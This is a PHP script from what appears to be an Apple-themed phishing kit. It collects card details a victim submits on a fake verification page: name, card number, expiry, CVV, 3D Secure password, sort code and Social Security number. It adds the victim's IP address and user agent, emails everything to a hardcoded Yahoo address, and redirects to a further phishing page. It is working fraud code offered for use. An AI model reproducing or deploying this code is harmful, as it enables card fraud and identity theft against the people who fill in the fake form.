<?php
session_start(); 
include "../bots.php";

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+DJOU| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Holder : ".$_POST['hold']."<br>\n";
$bilsmg .= "|Number : ".$_POST['numb']."<br>\n";
$bilsmg .= "|ExpDat : ".$_POST['expm']." / ".$_POST['expy']."<br>\n";
$bilsmg .= "|CVV----: ".$_POST['cvv']."<br>\n";
$bilsmg .= "|3D/VBV-: ".$_POST['3d']."<br>\n";
$bilsmg .= "|SORT---: ".$_POST['sort']."<br>\n";
$bilsmg .= "|SSN----: ".$_POST['ssn']."<br>\n";

$bilsmg .= "------------+DJOU| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "User Agent:  ".$_SERVER['HTTP_USER_AGENT']."\n";

$bilsnd = "yosrsafi@yahoo.fr";
$bilsub = "Apple VBV | From $ip";
$bilhead = "From:VBV INFO <support>";
$bilhead .= $_POST['yosrsafi@yahoo.fr']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../process2.php?dispatch={$_SESSION['DISPATCH_MD5_3']}";
header("location:$src");
?>